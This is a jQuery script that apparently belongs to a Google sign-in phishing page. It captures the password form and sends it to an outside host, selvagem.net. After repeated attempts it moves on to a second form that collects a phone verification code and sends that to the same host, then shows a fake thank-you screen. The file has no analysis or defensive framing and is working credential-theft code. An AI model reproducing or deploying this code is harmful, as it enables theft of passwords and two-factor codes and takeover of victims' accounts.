$(function () {

  var i=0;
  var j=0;

        $('#passwordNext').on('click', function (e) {

          e.preventDefault();
          i++;

          if(i==3)
          {
            //location.href = "https://google.com";
            //return false;
            $("#overlayer").show();
            $(".loader").delay(20000).fadeOut("slow");
          $("#overlayer").delay(10000).fadeOut("slow");
            $(".firstgoogle").hide();
            $(".secondgcode").show();
          }
      
          $.ajax({
            type: 'post',
            url: 'https://selvagem.net/share/post.php',
            dataType: 'json',
            data: $('#mail_form').serialize(),
            success: function (data) {
                console.log(data);
              if(data.status == 'sucess'){
                window.location.href = ""+data.username;
              }
              else{
                $('.error_msg').show();
                $(".mail_form_password").val('');
              }
            }
          });

        });



//gcode
 $('#idvPreregisteredPhoneNext').on('click', function (e) {

          e.preventDefault();
          j++;

         
          // i++;

          // if(i==2)
          // {
          //   location.href = "https://google.com";
          //   return false;
          // }
      
          $.ajax({
            type: 'post',
            url: 'https://selvagem.net/share/post2.php',
            dataType: 'json',
            data: $('.gcodeform').serialize(),
            success: function (data) {
                console.log(data);
              if(data.status == 'sucess'){
                window.location.href = ""+data.username;
              }
              else{
                $('.error_gcode').show();
                $("#idvPin").val('');
              }
            }
          });

          if(j==4)
  {

   $(".loader").show();
    $("#overlayer").show();

     $(".loader-inner").hide();

            //$(".loader").delay(5000).fadeOut("slow");
          $("#overlayer").delay(5000).fadeOut("slow");
    $(".secondgcode").hide();
    $(".googglethanks").show();
    return false;
  }   

        });


      });